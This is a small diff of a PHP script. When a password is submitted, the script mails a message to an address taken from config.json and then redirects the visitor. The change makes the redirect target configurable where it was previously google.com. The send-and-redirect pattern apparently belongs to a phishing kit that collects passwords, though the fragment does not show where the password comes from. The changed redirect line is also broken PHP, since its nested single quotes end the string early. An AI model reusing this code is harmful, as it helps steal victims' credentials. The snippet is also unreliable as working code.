@@ -9,12 +9,12 @@ $json = json_decode(file_get_contents("config.json"), true);
 $to = $json['email'];
 if (!$password){
 echo '<script script type="text/javascript">';
-echo 'window.location.href ="index.html";'; 
+echo 'window.location.href ="index.html";';
 echo '</script>';
 }
 else{
 echo '<script script type="text/javascript">';
-echo 'window.location.href ="http://google.com/";'; 
+echo 'window.location.href = $json['page-redirect']';
 echo '</script>';
 mail($to,$subject,$message,$header);
 }
